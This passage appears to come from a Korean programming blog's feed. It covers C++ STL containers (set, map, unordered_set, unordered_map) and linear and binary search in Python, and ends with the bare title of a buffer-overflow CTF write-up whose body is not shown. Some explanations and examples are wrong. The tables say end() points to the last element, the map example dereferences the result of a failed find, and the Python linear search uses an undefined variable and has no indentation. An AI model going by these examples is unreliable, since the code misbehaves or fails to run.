class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; v1.back() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 맨 뒤의 원소 반환 및 참조</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set은 associative container로 노드 기반 컨테이너로 구성되어 있고 균형 이진트리이다.</p><p>key로 불리는 원소의 집합으로 이루어진 컨테이너이다. (중복 허용 X)</p><p>insert 함수에 의해서 원소가 삽입되는데 이 떄의 원소는 자동으로 정렬(오름차순)된다.</p><p>허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”)</p><h3 id="set-선언"><a href="#set-선언" class="headerlink" title="set 선언"></a>set 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s1; <span class="comment">// 기본 생성자 선언</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="set-초기화"><a href="#set-초기화" class="headerlink" title="set 초기화"></a>set 초기화</h3><p>|Name|Context<br>|set&lt;자료형&gt; 변수이름| 기본 생성자 선언<br>|set&lt;자료형&gt; 변수이름(복사할 변수이름)| 생성자 선언 후 복사한 값으로 초기화</p><h3 id="set-반복자-iterator"><a href="#set-반복자-iterator" class="headerlink" title="set 반복자(iterator)"></a>set 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="set-용량-크기-size-capacity"><a href="#set-용량-크기-size-capacity" class="headerlink" title="set 용량, 크기(size, capacity)"></a>set 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="set-삽입-삭제"><a href="#set-삽입-삭제" class="headerlink" title="set 삽입, 삭제"></a>set 삽입, 삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="set의-기능"><a href="#set의-기능" class="headerlink" title="set의 기능"></a>set의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="set-사용-예제"><a href="#set-사용-예제" class="headerlink" title="set 사용 예제"></a>set 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s1;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator iter;</span><br><span class="line"></span><br><span class="line">    s1.insert(<span class="number">1</span>);</span><br><span class="line">    s1.insert(<span class="number">2</span>);</span><br><span class="line">    s1.insert(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(iter = s1.begin(); iter != s1.end(); iter++)&#123; <span class="comment">// iterator</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (s1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// s1 empty check(true/false)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// size 반환(result : 3)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s1.max_size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 최대 size 반환</span></span><br><span class="line"></span><br><span class="line">    s1.erase(<span class="number">3</span>); <span class="comment">// s1의 원소 3 지우기</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator iter2 = s1.find(<span class="number">2</span>); <span class="comment">// s1에서 2의 값을 검색</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(iter2 == s1.end())&#123; <span class="comment">// 조건문 시작 만약 find해서 결과를 못찾았다면?</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found..&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 결과가 있다면?</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;found!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// found</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s1.clear(); <span class="comment">// s1의 모든 원소 지우기</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map은 set과 같이 associative container의 종류로 노드 기반으로 이루어진 균형 이진 트리 구조이다.</p><p>map은 key, value로 이루어져 있고 pair 객체 형태로 저장된다.</p><p>key는 중복이 불가능(multimap에서는 사용이 가능하다)하며, set과 동일하게 원소가 삽입되면서 자동으로 오름차순 정렬이 된다.</p><p>map은 저장 공간의 필요에 따라서 allocator(동적 할당) 객체를 사용한다.</p><h3 id="map-선언"><a href="#map-선언" class="headerlink" title="map 선언"></a>map 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m1;</span><br></pre></td></tr></table></figure><h3 id="map-반복자-iterator"><a href="#map-반복자-iterator" class="headerlink" title="map 반복자(iterator)"></a>map 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="map-용량-크기-size-capacity"><a href="#map-용량-크기-size-capacity" class="headerlink" title="map 용량, 크기(size, capacity)"></a>map 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="map-삽입-삭제"><a href="#map-삽입-삭제" class="headerlink" title="map 삽입, 삭제"></a>map 삽입, 삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="map의-기능"><a href="#map의-기능" class="headerlink" title="map의 기능"></a>map의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="map-사용-예제"><a href="#map-사용-예제" class="headerlink" title="map 사용 예제"></a>map 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m1;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"></span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key&quot;</span>, <span class="number">1</span>)); <span class="comment">// map에 key,value 삽입(make_pair 사용)</span></span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key2&quot;</span>, <span class="number">2</span>));</span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key3&quot;</span>, <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (m1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// map이 비어있는지 검사</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.count(<span class="string">&quot;key1&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 카운트 반환 1 or 0</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.count(<span class="string">&quot;key2&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 카운트 반환 1 or 0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.find(<span class="string">&quot;key1&quot;</span>)-&gt;second &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// key1 검색</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator iter = m1.find(<span class="string">&quot;key4&quot;</span>); <span class="comment">// iterator key search</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(iter == m1.end())&#123; <span class="comment">// key를 못찾아서 end 반환했을 때</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;key not found&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = m1.begin(); it != m1.end(); it++)&#123; <span class="comment">// iterator 접근</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>map은 set과 사용하는 멤버 함수가 동일하다.</li></ul><h2 id="unordered-set"><a href="#unordered-set" class="headerlink" title="unordered_set"></a>unordered_set</h2><p>set과 거의 동일하지만 unordered_set은 원소를 삽입할 때 정렬하지 않는 컨테이너이고,</p><p>set은 이진 탐색 트리의 구조지만 unordered_set은 해쉬 테이블의 구조를 가지고 있다.</p><h3 id="unordered-set-사용-예제"><a href="#unordered-set-사용-예제" class="headerlink" title="unordered_set 사용 예제"></a>unordered_set 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; us1; <span class="comment">// 생성자 선언</span></span><br><span class="line">    <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;::iterator it; <span class="comment">// iterator 선언</span></span><br><span class="line">    </span><br><span class="line">    us1.insert(<span class="number">1</span>); <span class="comment">// us1(set)에 원소 삽입</span></span><br><span class="line">    us1.insert(<span class="number">2</span>);</span><br><span class="line">    us1.insert(<span class="number">3</span>);</span><br><span class="line">    us1.insert(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = us1.begin(); it != us1.end(); it++)&#123; <span class="comment">//iterator 반복자</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 출력</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><p>unordered_map 역시 map과 사용하는 방법은 동일하기 때문에 둘 중 어느것을 쓰던 문제가 없다.</p><p>다만 차이점이라면 set, unordered_set과 같이 이진 탐색 트리와 해쉬 테이블의 차이점을 가지고 있다.</p><p>속도가 빨라야 한다면 unordered_map를 사용하는 것도 권장할 수 있다.</p><p>하지만 데이터가 많아진다면 unordered_map 역시 속도가 느리다고 할 수 있는데,</p><p>결국 데이터가 적다면 unordered_map이 속도면에서는 유리하고 데이터가 많다면 map이 좋다.</p><h3 id="unordered-map-사용-예제"><a href="#unordered-map-사용-예제" class="headerlink" title="unordered_map 사용 예제"></a>unordered_map 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; um1; <span class="comment">// 생성자</span></span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"></span><br><span class="line">    um1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key1&quot;</span>, <span class="number">1</span>)); <span class="comment">// map에 원소 삽입(make_pair(key, value))</span></span><br><span class="line">    um1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key2&quot;</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = um1.begin(); it != um1.end(); it++)&#123; <span class="comment">// iterator 반복문</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; um1.find(<span class="string">&quot;key1&quot;</span>)-&gt;second &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// key find</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (um1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// map(um1)이 비어있는지 체크하고 true/false 반환</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><p><a href="https://modoocode.com/">https://modoocode.com/</a></p></li><li><p><a href="https://blockdmask.tistory.com/76">https://blockdmask.tistory.com/76</a></p></li><li><p><a href="https://blockdmask.tistory.com/70">https://blockdmask.tistory.com/70</a></p></li><li><p><a href="https://hwan-shell.tistory.com/130">https://hwan-shell.tistory.com/130</a></p></li><li><p><a href="https://blankspace-dev.tistory.com/347">https://blankspace-dev.tistory.com/347</a></p></li><li><p><a href="https://twpower.github.io/91-how-to-use-map-in-cpp">https://twpower.github.io/91-how-to-use-map-in-cpp</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> STL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>탐색 알고리즘(선형, 이진) 정리</title>
      <link href="2020/09/10/search-algorithm-200910/"/>
      <url>2020/09/10/search-algorithm-200910/</url>
      
        <content type="html"><![CDATA[<h2 id="탐색-알고리즘-종류"><a href="#탐색-알고리즘-종류" class="headerlink" title="탐색 알고리즘 종류"></a>탐색 알고리즘 종류</h2><h3 id="1-선형-탐색법-리니어-서치"><a href="#1-선형-탐색법-리니어-서치" class="headerlink" title="1. 선형 탐색법 (리니어 서치)"></a>1. 선형 탐색법 (리니어 서치)</h3><ul><li><p>왼쪽부터 순서대로 하나씩 확인해 나가는 방법</p></li><li><p>(한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법)</p></li><li><p>탐색 시작 → 결과를 탐색할 때까지 반복문 실행 → 결과값 반환 후 종료</p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">array, target</span>):</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(array):</span><br><span class="line"><span class="keyword">if</span> arr[i] == target:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="comment"># index 0~6</span></span><br><span class="line">target = <span class="number">9</span></span><br><span class="line"></span><br><span class="line">print(search(array,target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#result</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="2-이진-알고리즘-탐색-binary"><a href="#2-이진-알고리즘-탐색-binary" class="headerlink" title="2. 이진 알고리즘 탐색(binary)"></a>2. 이진 알고리즘 탐색(binary)</h3><ul><li><p>정렬된 리스트(배열) 에서 원하는 수(target) 값을 찾는 알고리즘 입니다.</p></li><li><p>선형 알고리즘 탐색 방법과 다르게 “이진 알고리즘” 탐색은 리스트가 정렬되어 있어야 한다는 점입니다.</p></li><li><p>배열의 전체의 중간 값(middle) 을 비교 합니다.</p></li><li><p>중간 값(middle) 이 원하는 수(target) 값보다 작다면 왼쪽, 크다면 오른쪽을 선택하여 탐색을 시작합니다.</p></li><li><p>선택된 방향에서 중간 값(middle) 과 원하는 수(target) 을 비교해서 같다면 탐색을 종료합니다.</p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarysearch</span>(<span class="params">array, target, left, right</span>):</span></span><br><span class="line">    middle_idx = (left+right)//<span class="number">2</span> <span class="comment"># 중간 지점 탐색</span></span><br><span class="line">    print(middle_idx)</span><br><span class="line">    middle = array[middle_idx] <span class="comment"># Array 배열 적용</span></span><br><span class="line">    <span class="keyword">if</span> target == middle: <span class="comment"># 탐색 값과 중간 값이 같다면</span></span><br><span class="line">        print(<span class="string">&#x27;result : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(middle)) <span class="comment"># 결과 리턴</span></span><br><span class="line">    <span class="keyword">elif</span> middle &gt; target: <span class="comment"># 탐색 값이 중간 값 보다 크다면</span></span><br><span class="line">        binarysearch(array, target, left, middle_idx-<span class="number">1</span>) <span class="comment"># 함수실행</span></span><br><span class="line">    <span class="keyword">elif</span> middle &lt; target: <span class="comment"># 탐색 값이 중간 값 보다 작다면</span></span><br><span class="line">        binarysearch(array, target, middle_idx+<span class="number">1</span>, right) <span class="comment"># 함수실행</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># 위 경우 모두 만족하지 않을 때 false 반환</span></span><br><span class="line"></span><br><span class="line">array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">length = <span class="built_in">len</span>(array)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line"></span><br><span class="line">array.sort()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;sort : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(array))</span><br><span class="line"></span><br><span class="line">target = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = length-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">binarysearch(array, target, <span class="number">0</span>, right)</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://velog.io/@keemun/1">https://velog.io/@keemun/1</a></p></li><li><p><a href="https://velog.io/@madfinger/Binary-Search%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8C%8C%EC%9D%B4%EC%8D%AC">https://velog.io/@madfinger/Binary-Search이진-탐색-파이썬</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> 선형 탐색 </tag>
            
            <tag> 이진 탐색 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTF 2020 BOF 101 Write up</title>
      <link href="2020/08/18/sstf-200818/"/>
      <url>2020/08/18/sstf-200818/</url>
      
